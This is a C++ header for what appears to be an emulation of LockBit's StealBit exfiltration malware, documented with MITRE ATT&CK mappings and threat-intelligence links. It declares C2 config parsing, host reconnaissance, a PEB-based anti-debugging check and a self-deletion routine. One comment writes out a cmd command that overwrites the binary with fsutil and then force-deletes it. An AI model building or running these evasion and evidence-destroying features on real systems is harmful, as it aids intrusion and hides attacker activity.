#pragma once
#ifndef __UTIL_H__
#define __UTIL_H__
#include <codecvt>
#include <sstream>
#include <fstream>
#include <iostream>
#include <string>
#include <windows.h>
#include <winternl.h>
#include <filesystem>

#include "settings.hpp"
#include "logger.hpp"
#include "xor_string.hpp"

// Debugger present flags
#define FLG_HEAP_ENABLE_TAIL_CHECK 0x10
#define FLG_HEAP_ENABLE_FREE_CHECK 0x20
#define FLG_HEAP_VALIDATE_PARAMETERS 0x40

namespace util {
	/*
	 * string_to_wstring:
	 *      About:
	 *          Converts standard ascii string to wide string
	 *      Result:
	 *          wstring equivilent is created from the std::string value
	 *      Returns:
	 *          std::wstring
	 *      MITRE ATT&CK Techniques:
	 *          n/a
	 *      CTI:
	 *          n/a
	 *      Other References:
	 *          n/a
	 */
	std::wstring string_to_wstring(const std::string& str);

	/*
	 * ReadParseConfig:
	 *      About:
	 *          Reads config file stored on disk and maps the values to config variables in the application
	 *      Result:
	 *          C2 Servers are saved in a vector and the malware_id is saved to a string.
	 *      Returns:
	 *          void
	 *      MITRE ATT&CK Techniques:
	 *          n/a
	 *      CTI:
	 *          https://web.archive.org/web/20220924195948/https://acn-marketing-blog.accenture.com/wp-content/uploads/2022/05/CIFR-Exfil-Tool-Comparison-Final.pdf
     *          https://www.cybereason.com/blog/research/threat-analysis-report-inside-the-lockbit-arsenal-the-stealbit-exfiltration-tool
	 *      Other References:
	 *          n/a
	 */
	bool ReadParseConfig();
}

namespace recon {

    /*
     * GetSystemComputerName:
     *      About:
     *          Gets the windows computer name using a widows api call: GetSystemComputerName()
     *      Result:
     *          Gets the computer name and retuns as a string
     *      Returns:
     *          [std::string]
     *      MITRE ATT&CK Techniques:
     *          T1106 NATIVE API
     *          T1082 System Information Discovery
     *      CTI:
     *          https://www.cybereason.com/blog/research/threat-analysis-report-inside-the-lockbit-arsenal-the-stealbit-exfiltration-tool
     *      Other References:
     *          n/a
     */
    std::string GetSystemComputerName();

    /*
     * GetSystemDomainName:
     *      About:
     *          Gets the local systems associated domain name / workgroup using a windows api call: GetHostname()
     *      Result:
     *          returns the system domain name/workgroup as a string
     *      Returns:
     *          [std::string]
     *      MITRE ATT&CK Techniques:
     *          T1106 NATIVE API
     *          T1082 System Information Discovery
     *      CTI:
     *          https://www.cybereason.com/blog/research/threat-analysis-report-inside-the-lockbit-arsenal-the-stealbit-exfiltration-tool
     *      Other References:
     *          n/a
     */
    std::string GetSystemDomainName();
}

namespace evasion {

    /*
     * IsProcessBeingDebugged:
     *      About:
     *          Check that specific flags are present in the PEB. at offset [[*PEB] + 0x60] if the value is equal to 0x70 then the application was launched with a debugger attached.
     *      Result:
     *          returns a bool; true if the application is being debugged, false otherwise.
     *      Returns:
     *          [bool]
     *      MITRE ATT&CK Techniques:
     *          T1622 Debugger Evasion
     *      CTI:
     *          https://www.cybereason.com/blog/research/threat-analysis-report-inside-the-lockbit-arsenal-the-stealbit-exfiltration-tool
     *      Other References:
     *          https://anti-debug.checkpoint.com/techniques/debug-flags.html
     */
    bool IsProcessBeingDebugged();


    /*
     * DeleteApplicationImageAfterExecution:
     *      About:
     *          Utilizes ShellExecuteExW to open and run a cmd command.
     *          the command is `ping 127.0.0.7 -n 7 > Nul & fsutil file setZeroData offset=0 length=<file size> <file path> & del /f /q <file path>`.
     *          It starts off with a ping, to allow the application to close completely, then overwrites the file and finally deletes it.
     *      Result:
     *          destroys & deletes the existing binary file
     *      Returns:
     *          [void]
     *      MITRE ATT&CK Techniques:
     *          T1070.004 Indicator Removal: File Deletion
     *      CTI:
     *          https://www.cybereason.com/blog/research/threat-analysis-report-inside-the-lockbit-arsenal-the-stealbit-exfiltration-tool
     *      Other References:
     *          
     */
    void DeleteApplicationImageAfterExecution();
}

#endif